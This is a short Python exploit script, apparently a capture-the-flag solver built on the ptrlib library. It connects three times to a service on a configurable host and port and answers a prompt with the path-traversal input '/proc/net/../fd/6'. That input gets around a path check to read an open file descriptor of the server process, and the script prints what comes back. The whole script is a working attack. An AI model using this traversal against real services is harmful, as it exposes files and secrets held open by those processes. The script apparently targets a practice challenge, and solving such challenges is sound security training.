import os
from ptrlib import *

host = os.getenv('HOST', '0.0.0.0')
port = os.getenv('PORT', '9712')

for i in range(3):
    sock = Socket(host, int(port))
    sock.sendlineafter("> ", f"/proc/net/../fd/6")
    print(sock.recv())
    sock.close()
